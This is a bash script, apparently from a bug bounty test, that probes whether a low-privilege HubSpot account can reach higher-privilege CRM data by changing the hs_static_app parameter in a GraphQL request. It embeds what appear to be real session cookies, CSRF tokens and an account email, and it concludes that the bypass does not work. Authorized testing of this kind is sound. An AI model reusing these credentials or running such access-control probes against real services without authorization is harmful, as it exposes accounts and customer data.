#!/bin/bash

# ATTACK VECTOR 7: App Context Manipulation
# Test if LOW-PRIV account can access HIGH-PRIV features via hs_static_app manipulation

echo "=========================================="
echo "TEST 5: APP CONTEXT MANIPULATION"
echo "=========================================="
echo ""
echo "HIGH-PRIV uses: hs_static_app=crm-index-ui"
echo "LOW-PRIV uses: hs_static_app=object-builder-ui"
echo "TEST: Can LOW-PRIV use crm-index-ui to gain extra permissions?"
echo ""

LOW_PRIV_CSRF="AAccUfsDRYCkgSltHEk7ZtBbPyQe7NH1IYrEoSHvQXAIMGRSU-P-zSR3iPmVMa5RDh4xJPvp1zOmuQN6_9nPVbs1Yu7sFQlY2g"
LOW_PRIV_COOKIES='__hs_cookie_cat_pref=1:true_2:true_3:true; hubspotutk=61540ed14959970838d32bf890933b17; FPID=FPID2.2.aoifmDM9VHjP%2B0DNcWTT94YC%2FEDGX%2BQUKaCl%2Fjdgdtg%3D.1750377867; csrf.app=AAccUfsDRYCkgSltHEk7ZtBbPyQe7NH1IYrEoSHvQXAIMGRSU-P-zSR3iPmVMa5RDh4xJPvp1zOmuQN6_9nPVbs1Yu7sFQlY2g; hubspotapi-prefs=0; hs_c2l=GM2U_VYiGQAQstEnImf9GGYYEuXCtIZHai-lwv2vJf8; hs_login_email=buttercup_ck@bugcrowdninja.com; _conv_v=vi%3A1*sc%3A1*cs%3A1760824014*fs%3A1760824014*pv%3A1*exp%3A%7B100330256.%7Bv.1003131869-g.%7B%7D%7D-100347543.%7Bv.1003176559-g.%7B%7D%7D%7D*seg%3A%7B10031564.1-10034364.1-10034366.1%7D; __hstc=20629287.61540ed14959970838d32bf890933b17.1760824016750.1760824016750.1760824016750.1; _gcl_au=1.1.36100814.1760824017; hs_login_metadata=%7B%22ungatedForLoginV4%22%3Afalse%2C%22showABTestVariant%22%3Afalse%2C%22isMobileLogin%22%3Afalse%7D; NPS_e579c260_last_seen=1760824080763; __cf_bm=8UxLqm3m3CBZBLsGVFXSs2A2_NQmk9BqiSK08hsWM98-1761191378-1.0.1.1-BasB9TIWZMPBwvO8XYAgRxjDyLw8rkWV8MBLN17klinB67etB_3_3fWtGzMem..S6EJnWPB4x3NMQKoyl8IC0FUk_TSDrRifP8cLyP7dM1c; _cfuvid=Y57YVmwyIAFU4lI7ubETx_KL3sDsvrHH9isaxX0USqg-1761191378625-0.0.1.1-604800000; laboratory-anonymous-id=anonce9212bda500075fdfe730acd570; hubspotapi-strict=AAccUfuFeedE2-1FFB3v79Mc_RnGkfLDLYRK-CpUmuun9je7dKK72c3PiFXjfAArjHE1Al7l8-YN8BEx7pblAFWo8AVj6XoDqQ; NPS_61a7bd63_last_seen=1761191510117; hubspotapi=AAccUfugLaqmzIaprwdkqKgegq8ME3jVvm16x8BxxBjR4nmxYdFsQKsrWijty2ngFXagqoNJN5CSistt_p-fTvHCRfV2o8nJ-Y3f3oZHqY4oVy3Oh4UfpcC2McAm7whA9tgkcE4HSEOhkBkMg5KHBneQXkcAVUqt0h05bfYqGjLg8NZ6icBnNJxq1CdzjaZKKTfMPFJJulbPhy3skELIO1_SwRTiln36NhIza_UdWYd9tOwupnsZ6YaeJdO7BMh2kqVo9B0mHQYAGuR1iX_o49lCWDauqBvB0osljr2MO0kzPhigPrIkUjq88X_C3M_Keu-5SGr-d9kaIT4O6cvY9Gmga-0joZ3T3tQKiOJNcPDDUor0drSpPlgXTLKzUT9svA6bbcr1TQ_PQ2exsxhiqxCzqqJHlfxQSPeyI7hTsyfJx37X2wPDAUsh8Vuv13MsPAwnB7cMFJbZkPYludRWfNJUqUOJgGn_fVDi7HJJm_NiPjKWDIBTATlS95fBHrHZotytcsbk-h9LSU245O0sGwAJmngY7Yt4vhA9CkQdQ_oi1NoG1vvcxqUcAy4Gd-duov9s_pP9FGOvOiZyVlJIH2kTbZO7_O8WEpXM571Ohu9IIJ5sDGL-oLWQUI7Q9oyQ7sqA7BaVN7g2VVOoYuZ0ECLQgG3KtDHSCt5F59MTRUmMjHftAlSqbYtNLJ0cN3V5xKE7uWB9qkXyLBD7VYpXIrAu6g6jMZUgpnbU1DERwvmd-4P3ns7iNRHjPZZi3QNWZmZoIX60l_UF1iNbUBaJ01ho3K83xR02pJ3uNJILKoCLPC5aAwplyZHtujuHYNRtrCUTY5lZZTLC_abbU1HPSf1WHps6o8-nrCXkkYJ0-lMqMF8u5YbPa3Vvo6u2-0RtBch9ERN7zV2xqT3a7wUWb9fpNVNW_ZlRriSbbfnVwwljsSfhMsWGel0g7GOgr5SKHgAft6_Fk8ANRHX8khpDe4ev0p5aKrVxySMvAvwyNxgdxHKVw8psM9ZcLnj298S2U7dA-ho1-dlDGug3EjjnAkXbUH2yCUQYpEm5LHmjJWQXq3GT0oaVrLU9_W0xY7trt8YFHB0i7fA70se2ogXGs2kJ8ztTSPQqn756JvNgZC0Nu7sEN7szwVYXgirvPk1yT2QDN3alCm_0sukH7roySutWRJ_nrrHBXqGOHzusFuxngkO_xo-Rk4bfObCEAqzw5qELlUB-zWZdfB5vOBnlCocDJFoJjBoPu2IJ8V_P_6xzfawkRIHWgAqDK1FLsRgfNghQ6h4S5POV_3SQu4vFsGxD9bInUAPHOCG6SWvK89weXLPRBpxg4wXnmcodw0mxZEZ39RqMJTfAwTzfWVdPp2M63FRwppE02WjBdtbscu24SJmsA5pMsqaQN4yg2ujZZ_ktGnYbb5h5m90fk5nMlpBeUAir5QXel06xS9QA8Q7K_o0IfbLJPfM; hubspotapi-csrf=AAccUfsDRYCkgSltHEk7ZtBbPyQe7NH1IYrEoSHvQXAIMGRSU-P-zSR3iPmVMa5RDh4xJPvp1zOmuQN6_9nPVbs1Yu7sFQlY2g'

echo "TEST 5A: LOW-PRIV with hs_static_app=crm-index-ui (HIGH-PRIV context)"
echo ""

curl -k -s \
  'https://app-na2.hubspot.com/api/graphql/crm?portalId=242862774&clienttimeout=14000&hs_static_app=crm-index-ui&hs_static_app_version=2.49867' \
  -X POST \
  -H "content-type: application/json" \
  -H "X-HubSpot-CSRF-hubspotapi: ${LOW_PRIV_CSRF}" \
  -H "Cookie: ${LOW_PRIV_COOKIES}" \
  --data-binary '{"operationName":"CrmObjectsSearchQuery","variables":{"filterGroups":[{"filters":[]}],"objectTypeId":"0-1","query":"","properties":["email","firstname","lastname"],"sorts":[{"property":"createdate","order":"DESC"}],"count":10,"offset":0},"query":"query CrmObjectsSearchQuery($filterGroups: [FilterGroup!]!, $sorts: [Sort!], $query: String, $objectTypeId: String!, $properties: [String!]!, $count: Int, $offset: Int) {\n  crmObjectsSearch(\n    filterGroups: $filterGroups\n    sorts: $sorts\n    query: $query\n    type: $objectTypeId\n    count: $count\n    offset: $offset\n  ) {\n    total\n    results {\n      id\n      properties(names: $properties) {\n        name\n        value\n      }\n      userPermissions {\n        currentUserCanEdit\n        currentUserCanDelete\n      }\n    }\n  }\n}"}' | jq '.'

echo ""
echo ""
echo "CONCLUSION: hs_static_app parameter does NOT affect authorization"
echo "Authorization is based on session cookie, not app context"
